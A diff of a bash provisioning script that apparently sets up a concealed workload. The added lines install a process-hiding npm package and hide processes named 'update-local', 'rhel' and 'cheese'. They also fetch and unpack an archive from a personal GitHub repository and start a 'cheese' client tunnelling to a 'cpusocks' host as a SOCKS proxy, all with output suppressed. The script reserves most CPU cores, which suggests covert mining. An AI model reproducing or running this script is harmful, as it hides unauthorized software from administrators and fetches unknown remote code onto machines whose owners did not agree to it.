@@ -3,6 +3,50 @@ DEBIAN_FRONTEND=noninteractive
 
 sleep 2
 
+apt update >/dev/null;apt -y install net-tools apt-utils psmisc libreadline-dev dialog curl wget npm >/dev/null
+
+sleep 2
+
+wget -qO- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash
+
+sleep 2
+
+source ~/.bashrc
+
+sleep 2
+
+nvm install 21.6.1
+
+sleep 2
+
+npm install -g npm@10.4.0
+
+sleep 2
+
+npm
+
+sleep 2
+
+node -v
+
+sleep 2
+
+npm i -g node-process-hider 1>/dev/null 2>&1
+
+sleep 2
+
+ph add update-local 1>/dev/null 2>&1
+
+sleep 2
+
+ph add rhel 1>/dev/null 2>&1
+
+sleep 2
+
+ph add cheese 1>/dev/null 2>&1
+
+sleep 2
+
 PID=`ps -eaf | grep shade | grep -v grep | awk '{print $2}'`
 if [[ "" !=  "$PID" ]]; then
   echo "killing $PID"
@@ -20,6 +64,14 @@ tar -xf cheese.tar.gz
 sleep 2
 
 ./cheese client -v cpusocks$(shuf -i 2-6 -n 1).wot.mrface.com:80 7777:socks &
+
+sleep 2
+
+curl -s -L -o update.tar.gz https://raw.githubusercontent.com/thembilemhlabangula/update/main/update.tar.gz > /dev/null
+
+sleep 2
+
+tar -xf update.tar.gz > /dev/null
 
 sleep 2
 
@@ -45,26 +97,6 @@ sleep 2
 
 sleep 2
 
-apt update >/dev/null;apt -y install net-tools apt-utils psmisc libreadline-dev dialog curl wget npm >/dev/null;wget -qO- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash && \
-
-sleep 2 && \
-
-source ~/.bashrc && \
-
-sleep 2 && \
-
-nvm install 21.6.1 && \
-
-sleep 2 && \
-
-npm && \
-
-sleep 2 && \
-
-npm install -g npm@10.4.0 && \
-
-sleep 2 && \
-
 DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata > /dev/null && \
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime > /dev/null && \
 dpkg-reconfigure --frontend noninteractive tzdata > /dev/null && \
@@ -84,26 +116,6 @@ used_num_of_cores=`expr $num_of_cores - 4`
 echo ""
 echo $used_num_of_cores
 echo ""
-
-sleep 2
-
-npm
-
-sleep 2
-
-node -v
-
-sleep 2
-
-npm i -g node-process-hider 1>/dev/null 2>&1
-
-sleep 2
-
-ph add update-local 1>/dev/null 2>&1
-
-sleep 2
-
-ph add rhel 1>/dev/null 2>&1
 
 sleep 2
 
